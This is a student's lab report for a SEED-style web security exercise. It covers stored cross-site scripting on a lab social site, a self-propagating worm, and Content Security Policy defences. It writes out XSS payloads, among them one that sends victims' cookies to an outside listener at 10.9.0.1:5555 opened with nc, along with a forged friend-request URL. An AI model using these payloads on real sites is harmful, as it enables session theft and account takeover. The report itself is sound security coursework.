#+TITLE: CSE-343
#+AUTHOR: Marc Soda Jr
#+OPTIONS: num:nil
#+STARTUP: overview
#+LATEX_HEADER: \usepackage[margin=0.5in]{geometry}
* Setup:
- Most of the mappings in /etc/hosts were already setup. I only had to add the one for seed-server.com
- I was having trouble getting the containers working. The solution was to delete all of the previous containers on the machine as they were causing come sort of conflict.
- Everything seems to work and I can establish a connection to seed-server.com through Firefox on the machine.
* Task 1:
- I logged in as Samy (who I will be using as my attacker).
- I went to her profile settings and added `<script>alert("XSS ATTACKED")</script>` to the brief description field of her profile.
- After refreshing I saw a popup saying my alert message. This lead me to believe the attack was successful.
- I then logged in as Alice (the victim in this context) and went to Samy's profile. Again, I received the malicious popup, indicating that the attack was successful. See screenshot.
[[./images/0.jpg]]
* Task 2:
- I logged back in as Samy and edited the previous code in the brief description section to read `<script>alert(document.cookie)</script>`
- The cookie information was displayed on my page indicating that the attack may have been successful.
- I then logged out and logged in as Alice and went to Samy's profile. The cookie information was alerted to the page, indicating that the attack was successful. See screenshot.
[[./images/1.jpg]]
* Task 3:
- I logged back in as Samy and edited the previous code in the brief description section to read `<script>document.write('<img src=http://10.9.0.1:5555?c=' + escape(document.cookie) + ' >');`
- I then went to the seed console and ran `nc -lknv 5555` to listen on port 5555
- I then logged out and logged back in as Alice and went to Sammy's profile. The cookie contents were received therefore the attack was successful. See screenshot.
[[./images/2.jpg]]
* Task 4:
- I logged back in as Samy and edited the about me section of her profile as indicated on the lab.
- I used HTTP Live header to figure out how to construct the URL. See screenshot.
- The URL I used was `"http://www.seed-server.com/action/friends/add?friend=59" + token + ts`.
[[./images/3.jpg]]
- I was then able to log in as Alice, navigate to Samy's page, and see that Samy was added as Alice's friend.
- Question 1:
  - ts and token represent two security tokens that need to be sent with the friend request for it to be valid. It is a security mechanism. As I found out using HTTP Live Header, they are appended to the end of the URL.
  - Yes. You can add the code to a JavaScript function and add code to a different section of the profile (such as the brief description section). This code will load the malicious JavaScript code and run the attack successfully.
* Task 5:
- I logged in an Samy and edited the HTML of the About Me section to read:
[[./images/4.jpg]]
- When I logged in as Alice, navigated to Samy's page, then checked Alice's profile I noticed that her About Me section contained my malicious message, indicating that the attack was a success. See screenshot.
[[./images/5.jpg]]
- Question 3:
  - We need line one so Samy doesn't attack himself. Removing line one will cause the About Me section of Samy to display the malicious message.

* Task 6:
- The worm is now self-propagating. See below screenshot for the code added to Samy's About Me section.
[[./images/7.jpg]]
- If I logout as Samy and log back in as Alice and navigate to Sam's page, her About Me section is changed to the malicious message I included in my attack, as expected. Furthermore, if I logout and log back in as Boby and navigate to Alice's page, his About Me message is updated to the malicious message. Therefore the code is self-propagating and the attack was a success.
[[./images/6.jpg]]

* Task 7:
- Question 1 and 2:
  - example32a.com
    - 1-6 are OK
    - On button click, displays alert "JS Code executed"
    - all because CSP not enabled
  - example32b.com
    - 1-3 and 5 Failed
    - 4 and 6 are OK
    - On button click, nothing happens
    - all because CSP header only allows for JS from self and the example70.com domain.
  - example32c.com
    - 2, 3, and 5 FAILED
    - 1, 4, and 6 are OK
    - On button click, nothing happens
    - all because the PHP file's CSP header allows JS from self, the example70.com domain, and nonce-111-111-111
- Question 3:
  - For example32b.com, area 6 is already OK, but area 5 is not. In order to make area 5 OK we need to add *.example60.com to the script-src section of the www.example32.com VirtualHost in /etc/apache2/sites-available/apache_csp.conf. See screenshot. After writing the file, I ran service apache2 restart. When refreshing the http://www.example32b.com site I not get area 5 and 6 showing OK. See screenshot.
  - Code:
    - [[./images/9.jpg]]
  - Result:
    - [[./images/8.jpg]]
- Question 4:
  - For example32c.com, area 4 and 6 are already OK, but 2 and 5 are not. In order to make them okay I needed to add *.example60.com and nonce-222-222-222 to the cps header in /var/www/csp/phpindex.php. See screenshot. After writing the file, I ran service apache2 restart. When refreshing the http://www.example32c.com site, I get the expected output. See screenshot.
  - Code:
    - [[./images/011.jpg]]
  - Result:
    - [[./images/010.jpg]]
- Question 5:
  - CSP defends against cross-site-scripting attacks by restricting JavaScript code from unintended sources. It also restricts other page contents like limiting where images, audio, and video come from.
